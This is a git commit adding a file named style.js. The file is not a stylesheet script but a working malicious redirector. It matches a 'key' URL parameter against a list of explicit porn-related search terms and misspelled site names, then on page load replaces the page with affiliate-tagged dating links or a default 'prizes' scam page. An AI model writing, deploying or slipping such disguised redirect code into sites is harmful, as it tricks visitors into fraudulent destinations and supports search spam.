97690e225be82a1bf4416c88d3185cc0cab8a476
redtwo1 <57567705+redtwo1@users.noreply.github.com>
2022-11-24 17:38:38 +0100

    Add files via upload

---
+++ style.js
@@ -0,0 +1,85 @@
+var data = {
+      'porn': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=porn',
+      'phub': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=phub',
+      'hamster': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=hamster',
+      'xxx': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=xxx',
+      'henta': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=henta',
+      'spankbang': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=spankbang',
+      'gay': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=gay',
+      'tit': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=tit',
+      'lesbian': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=lesbian',
+      'khalifa': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=khalifa',
+      'bangbros': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=bangbros',
+      'xnnx': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=xnnx',
+      'xnxx': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=xnxx',
+      'sex': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=sex',
+      'imagefap': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=imagefap',
+      'blowjob': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=blowjob',
+      'pirnhub': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=pirnhub',
+      'riley': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=riley',
+      'tastyblack': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=tastyblack',
+      'pormhub': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=pormhub',
+      'thumbzilla': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=thumbzilla',
+      'sxyprn': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=sxyprn',
+      'shesfreaky': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=shesfreaky',
+      'mature': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=mature',
+      'women': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=women',
+      'woman': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=woman',
+      'mom': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=mom',
+      'creampie': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=creampie',
+      'xvid': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=xvid',
+      'poenhub': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=poenhub',
+      'luxuretv': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=luxuretv',
+      'ebony': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=ebony',
+      'nude': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=nude',
+      'kendra': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=kendra',
+      'bellringer': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=bellringer',
+      'tub': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=tub',
+      'porbhub': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=porbhub',
+      'bbw': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=bbw',
+      'handjob': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=handjob',
+      'sasha': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=sasha',
+      'rule34video': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=rule34video',
+      'tnaflix': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=tnaflix',
+      'male': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=male',
+      '3movs': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=3movs',
+      'footjob': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=footjob',
+      'cum': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=cum',
+      'ass': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=ass',
+      'boob': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=boob',
+      'puss': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=puss',
+      'beegcom': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=beegcom',
+      'granny': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=granny',
+      'brazzer': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=brazzer',
+      'anal': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=anal',
+      'hardcore': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=hardcore',
+      'teamskeet': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=teamskeet',
+      'girl': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=girl',
+      'onlyfan': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=onlyfan',
+      'adult': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=adult',
+      'tabo': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=tabo',
+      'bangbus': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=bangbus',
+      'fuck': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=fuck',
+      'bitch': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=bitch',
+      'prostitut': 'https://bestdatingmix.life/?u=fn7nu1c&o=m0ppe9l&t=prostitut'
+    };
+
+var default_url = "https://bestrealprizes.life/?u=fn7nu1c&o=m0gpe9l&t=filtered";
+    
+let key_path = location.search.split("key=")[1];
+
+var BreakException = {};
+try {
+  if(key_path.length &gt; 2){
+     Object.keys(data).forEach(function(key) {
+        if(key_path.indexOf(key) != -1){
+           default_url = data[key];
+           throw BreakException;
+         }
+      })
+   }
+}catch (e) {
+  if (e !== BreakException) throw e;
+}
+    
+window.location.replace(default_url)
